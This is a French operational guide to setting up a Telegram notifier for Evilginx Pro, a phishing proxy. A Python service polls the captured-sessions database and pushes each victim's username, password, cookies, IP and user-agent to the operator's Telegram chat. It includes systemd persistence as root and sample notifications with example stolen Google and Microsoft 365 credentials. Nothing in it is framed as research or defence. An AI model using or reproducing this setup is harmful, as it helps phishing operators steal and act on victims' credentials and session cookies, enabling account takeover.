# 📱 GUIDE COMPLET - NOTIFICATIONS TELEGRAM POUR EVILGINX PRO

## 🎯 Vue d'ensemble

Ce guide vous permet de recevoir des **notifications Telegram en temps réel** pour chaque session capturée par Evilginx Pro.

**Fonctionnalités** :

- ✅ Notifications instantanées sur Telegram
- ✅ Surveillance 24/7 de la base de données Evilginx
- ✅ Formatage riche avec émojis
- ✅ Détails complets (credentials, cookies, IP, User-Agent)
- ✅ Support multi-phishlets
- ✅ Système d'état pour éviter les doublons
- ✅ Logs détaillés
- ✅ Service systemd pour démarrage automatique

---

## 📋 TABLE DES MATIÈRES

1. [Prérequis](#prérequis)
2. [Création du Bot Telegram](#création-du-bot-telegram)
3. [Installation du Script](#installation-du-script)
4. [Configuration](#configuration)
5. [Test Manuel](#test-manuel)
6. [Installation Service Systemd](#installation-service-systemd)
7. [Monitoring et Logs](#monitoring-et-logs)
8. [Troubleshooting](#troubleshooting)
9. [Exemples de Notifications](#exemples-de-notifications)

---

## 🔧 PRÉREQUIS

### Système

```bash
# Python 3.7+
python3 --version

# Pip
pip3 --version

# Evilginx Pro installé
ls ~/evilginx-pro/data/sessions.db
```

### Dépendances Python

```bash
# Installer les dépendances
pip3 install requests

# Vérifier l'installation
python3 -c "import requests; print('✅ OK')"
```

---

## 🤖 CRÉATION DU BOT TELEGRAM

### Étape 1 : Créer le Bot

1. **Ouvrir Telegram** et chercher `@BotFather`
2. **Envoyer** : `/newbot`
3. **Choisir un nom** : `Evilginx Notifier` (ou autre)
4. **Choisir un username** : `evilginx_notifier_bot` (doit finir par `_bot`)

### Étape 2 : Récupérer le Token

```
BotFather vous donnera un token :
1234567890:ABCdefGHIjklMNOpqrsTUVwxyz123456789

⚠️ GARDEZ CE TOKEN SECRET !
```

### Étape 3 : Obtenir votre Chat ID

**Méthode 1 : Via bot**

1. Chercher `@userinfobot` sur Telegram
2. Envoyer `/start`
3. Le bot vous donnera votre **Chat ID** (ex: `123456789`)

**Méthode 2 : Via API**

```bash
# Envoyer un message à votre bot, puis :
curl "https://api.telegram.org/bot<VOTRE_TOKEN>/getUpdates"

# Chercher "chat":{"id":123456789
```

### Étape 4 : Configuration pour Groupe (Optionnel)

Si vous voulez recevoir dans un groupe :

1. Créer un groupe Telegram
2. Ajouter votre bot au groupe
3. Envoyer un message dans le groupe
4. Récupérer le Chat ID du groupe :

```bash
curl "https://api.telegram.org/bot<VOTRE_TOKEN>/getUpdates"

# Le Chat ID d'un groupe commence par -
# Ex: -1001234567890
```

---

## 📥 INSTALLATION DU SCRIPT

### Étape 1 : Copier le Script

```bash
# Copier depuis /tmp/
sudo cp /tmp/telegram_notifier.py /usr/local/bin/telegram_notifier.py

# Rendre exécutable
sudo chmod +x /usr/local/bin/telegram_notifier.py

# Vérifier
ls -lh /usr/local/bin/telegram_notifier.py
```

### Étape 2 : Éditer la Configuration

```bash
sudo nano /usr/local/bin/telegram_notifier.py
```

**Modifier ces lignes** :

```python
# Configuration Telegram (À MODIFIER)
TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz123456789"  # Votre token
TELEGRAM_CHAT_ID = "123456789"  # Votre Chat ID

# Configuration Evilginx
EVILGINX_DB_PATH = os.path.expanduser("~/evilginx-pro/data/sessions.db")
CHECK_INTERVAL = 10  # Secondes entre chaque vérification
```

---

## ⚙️ CONFIGURATION

### Paramètres Disponibles

| Paramètre            | Description                      | Valeur par défaut                   |
| -------------------- | -------------------------------- | ----------------------------------- |
| `TELEGRAM_BOT_TOKEN` | Token du bot Telegram            | `"YOUR_BOT_TOKEN_HERE"`             |
| `TELEGRAM_CHAT_ID`   | ID du chat (user ou groupe)      | `"YOUR_CHAT_ID_HERE"`               |
| `EVILGINX_DB_PATH`   | Chemin vers sessions.db          | `~/evilginx-pro/data/sessions.db`   |
| `CHECK_INTERVAL`     | Intervalle de vérification (sec) | `10`                                |
| `LOG_FILE`           | Fichier de logs                  | `/tmp/telegram_notifier.log`        |
| `LOG_LEVEL`          | Niveau de logs                   | `INFO`                              |
| `STATE_FILE`         | Fichier d'état                   | `/tmp/telegram_notifier_state.json` |

---

## 🧪 TEST MANUEL

### Test de Connexion

```bash
# Tester le bot Telegram
curl "https://api.telegram.org/bot<VOTRE_TOKEN>/getMe"

# Doit retourner les infos du bot
```

### Lancer le Script

```bash
# Exécution manuelle
python3 /usr/local/bin/telegram_notifier.py

# Sortie attendue :
# ============================================================
# EVILGINX TELEGRAM NOTIFIER - DÉMARRAGE
# ============================================================
# Connexion Telegram OK - Bot: evilginx_notifier_bot
# Surveillance de: /root/evilginx-pro/data/sessions.db
# Intervalle de vérification: 10s
# Monitoring actif...
```

### Notification de Démarrage

Vous devriez recevoir sur Telegram :

```
🚀 EVILGINX NOTIFIER STARTED

✅ Le monitoring des sessions est actif
📡 Surveillance en temps réel activée

Configuration:
├─ Check interval: 10 secondes
├─ Database: /root/evilginx-pro/data/sessions.db
└─ Status: 🟢 ONLINE
```

### Arrêter le Test

```bash
# Ctrl+C
^C
```

---

## 🚀 INSTALLATION SERVICE SYSTEMD

### Créer le Service

```bash
sudo nano /etc/systemd/system/telegram_notifier.service
```

**Contenu** :

```ini
[Unit]
Description=Evilginx Telegram Notifier
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root
ExecStart=/usr/bin/python3 /usr/local/bin/telegram_notifier.py
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier=telegram_notifier

[Install]
WantedBy=multi-user.target
```

### Activer et Démarrer

```bash
# Recharger systemd
sudo systemctl daemon-reload

# Activer au démarrage
sudo systemctl enable telegram_notifier.service

# Démarrer le service
sudo systemctl start telegram_notifier.service

# Vérifier le status
sudo systemctl status telegram_notifier.service
```

**Sortie attendue** :

```
● telegram_notifier.service - Evilginx Telegram Notifier
   Loaded: loaded (/etc/systemd/system/telegram_notifier.service; enabled)
   Active: active (running) since Wed 2025-12-25 10:00:00 UTC
   Main PID: 12345 (python3)
```

### Commandes Utiles

```bash
# Démarrer
sudo systemctl start telegram_notifier

# Arrêter
sudo systemctl stop telegram_notifier

# Redémarrer
sudo systemctl restart telegram_notifier

# Voir les logs
sudo journalctl -u telegram_notifier -f

# Désactiver
sudo systemctl disable telegram_notifier
```

---

## 📊 MONITORING ET LOGS

### Logs Systemd

```bash
# Logs en temps réel
sudo journalctl -u telegram_notifier -f

# Dernières 100 lignes
sudo journalctl -u telegram_notifier -n 100

# Logs d'aujourd'hui
sudo journalctl -u telegram_notifier --since today
```

### Logs du Script

```bash
# Voir les logs
tail -f /tmp/telegram_notifier.log

# Dernières 50 lignes
tail -n 50 /tmp/telegram_notifier.log

# Chercher les erreurs
grep ERROR /tmp/telegram_notifier.log
```

### Fichier d'État

```bash
# Voir les sessions notifiées
cat /tmp/telegram_notifier_state.json

# Réinitialiser (pour re-notifier)
sudo rm /tmp/telegram_notifier_state.json
sudo systemctl restart telegram_notifier
```

---

## 🔍 TROUBLESHOOTING

### Problème 1 : Token invalide

**Erreur** :

```
❌ TELEGRAM_BOT_TOKEN non configuré
```

**Solution** :

```bash
sudo nano /usr/local/bin/telegram_notifier.py
# Modifier TELEGRAM_BOT_TOKEN
sudo systemctl restart telegram_notifier
```

### Problème 2 : Database introuvable

**Erreur** :

```
❌ Base de données introuvable
```

**Solution** :

```bash
# Trouver la DB
find / -name "sessions.db" 2>/dev/null

# Mettre à jour le chemin
sudo nano /usr/local/bin/telegram_notifier.py
```

### Problème 3 : Pas de notifications

**Diagnostic** :

```bash
# Vérifier le service
sudo systemctl status telegram_notifier

# Voir les logs
sudo journalctl -u telegram_notifier -n 50

# Test manuel
python3 /usr/local/bin/telegram_notifier.py
```

### Problème 4 : Permissions

**Erreur** :

```
PermissionError: Permission denied
```

**Solution** :

```bash
# Vérifier l'utilisateur du service
sudo systemctl cat telegram_notifier | grep User

# Changer en root si nécessaire
sudo systemctl edit telegram_notifier
```

---

## 📨 EXEMPLES DE NOTIFICATIONS

### Google Session

```
🎯 NOUVELLE SESSION CAPTURÉE 📧

📋 Informations
├─ Phishlet: google
├─ Session ID: #42
├─ Timestamp: 2025-12-25 14:30:45

👤 Credentials
├─ Username: victim@company.com
└─ Password: P@ssw0rdSecure123

🍪 Cookies
├─ Captured: 8 cookies
└─ Domains: .google.com

🌐 Source
├─ IP: 203.0.113.45
├─ Country: N/A
└─ User-Agent: Mozilla/5.0...

⏱️ Status: ✅ ACTIVE
```

### Microsoft 365 Session

```
🎯 NOUVELLE SESSION CAPTURÉE 💼

📋 Informations
├─ Phishlet: microsoft365
├─ Session ID: #43
├─ Timestamp: 2025-12-25 15:15:20

👤 Credentials
├─ Username: john.doe@acmecorp.com
└─ Password: SecurePassword456!

🍪 Cookies
├─ Captured: 12 cookies
└─ Domains: .microsoftonline.com

🌐 Source
├─ IP: 198.51.100.23
├─ Country: N/A
└─ User-Agent: Mozilla/5.0...

⏱️ Status: ✅ ACTIVE
```

---

## 🔐 SÉCURITÉ

### Protéger le Token

```bash
# Permissions strictes
sudo chmod 700 /usr/local/bin/telegram_notifier.py

# Logs sensibles
sudo chmod 600 /tmp/telegram_notifier.log
```

### Rotation des Logs

```bash
# Créer rotation
sudo nano /etc/logrotate.d/telegram_notifier
```

**Contenu** :

```
/tmp/telegram_notifier.log {
    daily
    rotate 7
    compress
    missingok
    notifempty
}
```

---

## 📚 COMMANDES RÉCAPITULATIVES

### Installation Complète

```bash
# 1. Copier le script
sudo cp /tmp/telegram_notifier.py /usr/local/bin/
sudo chmod +x /usr/local/bin/telegram_notifier.py

# 2. Éditer la config
sudo nano /usr/local/bin/telegram_notifier.py
# Modifier TELEGRAM_BOT_TOKEN et TELEGRAM_CHAT_ID

# 3. Installer les dépendances
pip3 install requests

# 4. Créer le service
sudo cp /tmp/telegram_notifier.service /etc/systemd/system/
sudo systemctl daemon-reload

# 5. Activer et démarrer
sudo systemctl enable telegram_notifier
sudo systemctl start telegram_notifier

# 6. Vérifier
sudo systemctl status telegram_notifier
sudo journalctl -u telegram_notifier -f
```

---

**🔔 Vous êtes prêt à recevoir vos notifications Telegram !**

_Guide créé le 25 décembre 2025_
_Compatible Evilginx Pro 3.0+_
